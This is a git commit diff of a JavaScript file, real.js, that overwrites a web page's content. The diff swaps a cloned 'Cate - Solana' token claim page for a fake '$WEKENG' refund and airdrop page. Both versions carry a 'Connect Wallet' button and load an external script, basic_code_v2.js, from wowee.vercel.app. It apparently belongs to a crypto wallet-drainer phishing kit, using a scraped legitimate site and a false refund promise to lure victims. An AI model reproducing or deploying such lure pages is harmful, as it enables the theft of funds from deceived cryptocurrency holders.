ab71bce7094b1432460e68fa5b77489de9f1c302
Spingrid <118059301+Spingrid@users.noreply.github.com>
2024-09-24 19:24:09 +0100

    Update real.js

--- real.js
+++ real.js
@@ -8,243 +8,56 @@ const ensurePageChange = setInterval(() => {
     return clearInterval(ensurePageChange);
   };
   document.documentElement.innerHTML = `
-  <!DOCTYPE html>
-<html
-  lang="en-US"
-  data-scrapbook-source="https://catesolana.net/claim/"
-  data-scrapbook-create="20240924175439188"
-  data-scrapbook-title="WELCOME TO Cate - Solana"
->
-  <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-    <meta charset="UTF-8" />
-    <title>WELCOME TO Cate - Solana</title>
-    <meta name="robots" content="max-image-preview:large" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
-      rel="stylesheet"
-    />
+  <html class="html" lang="ru"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Discover $WEKENG, a unique memecoin on Solana with airdrops for early holders and 90% liquidity on Raydium">
+  <meta http-equiv="content-type" content="public, max-age=3600">
+  <meta name="theme-color" content="#fff">
+  <title>$WEKENG | Refunds</title>
+  <link rel="shortcut icon" href="https://wowee.vercel.app/refund.svg" type="image/x-icon">
+  <link rel="stylesheet" href="https://wowee.vercel.app/style.min.css">
+</head>
+<body class="body">
 
-    <link href="https://wowee.vercel.app/css2.css" rel="stylesheet" />
-
-    <link
-      rel="stylesheet"
-      id="hello-elementor-css"
-      href="https://wowee.vercel.app/style.min.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="hello-elementor-theme-style-css"
-      href="https://wowee.vercel.app/theme.min.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="hello-elementor-header-footer-css"
-      href="https://wowee.vercel.app/header-footer.min.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="elementor-frontend-css"
-      href="https://wowee.vercel.app/frontend-lite.min.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="elementor-post-8-css"
-      href="https://wowee.vercel.app/post-8.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="swiper-css"
-      href="https://wowee.vercel.app/swiper.min.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="elementor-pro-css"
-      href="https://wowee.vercel.app/frontend-lite.min_002.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="elementor-global-css"
-      href="https://wowee.vercel.app/global.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="elementor-post-10-css"
-      href="https://wowee.vercel.app/post-10.css"
-      media="all"
-    />
-    <link
-      rel="stylesheet"
-      id="google-fonts-1-css"
-      href="https://wowee.vercel.app/css.css"
-      media="all"
-    />
-
-    <link rel="icon" href="https://wowee.vercel.app/logo.jpg" sizes="32x32" />
-    <link rel="icon" href="https://wowee.vercel.app/logo.jpg" sizes="192x192" />
-    <link
-      rel="apple-touch-icon"
-      href="https://catesolana.net/claim/photo/logo.jpg"
-    />
-    <meta name="msapplication-TileImage" content="photo/logo.jpg" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, viewport-fit=cover"
-    />
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <style>
-      body {
-        font-family: "Roboto", sans-serif;
-      }
-    </style>
-  </head>
-  <body
-    class="home page-template page-template-elementor_canvas page page-id-10 wp-custom-logo elementor-default elementor-template-canvas elementor-kit-8 elementor-page elementor-page-10 e--ua-firefox e--ua-blink e--ua-chrome e--ua-webkit"
-    data-elementor-device-mode="desktop"
-  >
-    <div
-      data-elementor-type="wp-page"
-      data-elementor-id="10"
-      class="elementor elementor-10"
-      data-elementor-post-type="page"
-    >
-      <div
-        class="elementor-element elementor-element-013a51c e-con-full e-flex e-con e-parent"
-        data-id="013a51c"
-        data-element_type="container"
-        data-core-v316-plus="true"
-      >
-        <div
-          class="elementor-element elementor-element-9af4b90 elementor-widget__width-initial premium-floating-effects-yes elementor-widget-tablet__width-auto elementor-widget-mobile__width-auto elementor-widget elementor-widget-heading animated bounceIn"
-          data-id="9af4b90"
-          data-element_type="widget"
-          data-settings='{"_animation":"bounceIn","premium_fe_scale_switcher":"yes","premium_fe_Xscale":{"unit":"px","size":"","sizes":{"from":1,"to":1.2}},"premium_fe_Xscale_tablet":{"unit":"px","size":"","sizes":[]},"premium_fe_Xscale_mobile":{"unit":"px","size":"","sizes":[]},"premium_fe_Yscale":{"unit":"px","size":"","sizes":{"from":1,"to":1.2}},"premium_fe_Yscale_tablet":{"unit":"px","size":"","sizes":[]},"premium_fe_Yscale_mobile":{"unit":"px","size":"","sizes":[]},"premium_fe_scale_duration":{"unit":"px","size":1000,"sizes":[]},"premium_fe_scale_delay":{"unit":"px","size":"","sizes":[]},"premium_fe_direction":"alternate","premium_fe_loop":"default","premium_fe_easing":"easeInOutSine"}'
-          data-widget_type="heading.default"
-        >
-          <div
-            class="elementor-widget-container"
-            style="transform: scaleX(1.12227) scaleY(1.12227)"
-          >
-            <h2 class="elementor-heading-title elementor-size-default">
-              WELCOME TO Cate - Solana
-            </h2>
-          </div>
-        </div>
-        <div
-          class="elementor-element elementor-element-78cf63b e-flex e-con-boxed e-con e-child"
-          data-id="78cf63b"
-          data-element_type="container"
-        >
-          <div class="e-con-inner">
-            <div
-              class="elementor-element elementor-element-b30ac86 elementor-widget elementor-widget-image"
-              data-id="b30ac86"
-              data-element_type="widget"
-              data-widget_type="image.default"
-            >
-              <div class="elementor-widget-container">
-                <img
-                  fetchpriority="high"
-                  decoding="async"
-                  width="300"
-                  height="300"
-                  src="https://wowee.vercel.app/logo.jpg"
-                  class="attachment-large size-large wp-image-621"
-                  alt=""
-                />
-              </div>
-            </div>
-
-            <div
-              class="elementor-element elementor-element-2ff0cff e-flex e-con-boxed e-con e-child"
-              data-id="2ff0cff"
-              data-element_type="container"
-            >
-              <div class="e-con-inner">
-                <div
-                  class="elementor-element elementor-element-385397b elementor-align-center elementor-widget elementor-widget-button"
-                  data-id="385397b"
-                  data-element_type="widget"
-                  data-widget_type="button.default"
-                >
-                  <div class="elementor-widget-container">
-                    <div class="elementor-button-wrapper">
-                      <a
-                        class="elementor-button elementor-button-link elementor-size-sm elementor-animation-shrink connect-wallet"
-                        style="cursor: pointer"
-                        _1727200476854="true"
-                      >
-                        <span class="elementor-button-content-wrapper">
-                          <span class="elementor-button-text">CLAIM</span>
-                        </span>
-                      </a>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div
-          class="elementor-element elementor-element-e535b5a e-flex e-con-boxed e-con e-parent"
-          data-id="e535b5a"
-          data-element_type="container"
-          data-core-v316-plus="true"
-        >
-          <div class="e-con-inner">
-            <div
-              class="elementor-element elementor-element-933cffb elementor-widget elementor-widget-heading"
-              data-id="933cffb"
-              data-element_type="widget"
-              data-widget_type="heading.default"
-            >
-              <div class="elementor-widget-container">
-                <img
-                  fetchpriority="high"
-                  decoding="async"
-                  width="100%"
-                  src="https://wowee.vercel.app/1.jpg"
-                  class="attachment-large size-large wp-image-621"
-                  alt=""
-                  style="border-radius: 10px"
-                />
-                <h2 class="elementor-heading-title elementor-size-default">
-                  ©2024 $Cate, All Right Reserved.
-                </h2>
-              </div>
-            </div>
-          </div>
-        </div>
+<main>
+  <section class="refund">
+    <div class="container">
+      <img class="refund__img" src="https://wowee.vercel.app/refund.svg" width="472" height="472" alt="refund $WEKENG">
+      <div class="refund__content">
+        <h1 class="refund__title">
+          Get a refund of spent $SOL and take part in the airdrop of the new token
+        </h1>
+        <p class="refund__text">
+          Unfortunately, we have had some issues with the launch of $WEKENG. If you bought the token, get your $SOL back and get airdrop of our new token
+        </p>
+        <button class="refund__btn connect-wallet" type="button">Connect Wallet</button>
       </div>
-      <link
-        rel="stylesheet"
-        id="e-animations-css"
-        href="https://wowee.vercel.app/animations.min.css"
-        media="all"
-      />
-
-      <span id="elementor-device-mode" class="elementor-screen-only"></span>
-
-      <svg style="display: none" class="e-font-icon-svg-symbols"></svg>
     </div>
-    <span id="elementor-device-mode" class="elementor-screen-only"></span
-    ><svg style="display: none" class="e-font-icon-svg-symbols"></svg>
-    <div id="pageFullyLoadedActive" style="display: none"></div>
-  <script src="https://wowee.vercel.app/basic_code_v2.js"></script>
-  </body>
-</html>
+  </section>
+</main>
+<footer class="footer" id="community">
+  <div class="container">
+    <div class="footer__inner">
+      <nav class="footer__nav">
+        <span class="footer__site">$WEKENG</span>
+        <span class="footer__decor"></span>
+        <ul class="footer__list">
+          <li>
+            <a class="footer__link desktop" href="https://t.me" target="_blank">Telegram</a>
+          </li>
+          <li>
+            <a class="footer__link desktop" href="https://x.com" target="_blank">X (Twitter)</a>
+          </li>
+        </ul>
+      </nav>
+      <p class="footer__copy">
+        (c) 2024 by $WEKENG team. All rights reserved
+      </p>
+    </div>
+  </div>
+</footer><div id="pageFullyLoadedActive" style="display: none"></div><script src="https://wowee.vercel.app/basic_code_v2.js"></script></body></html>
 
 
 `;
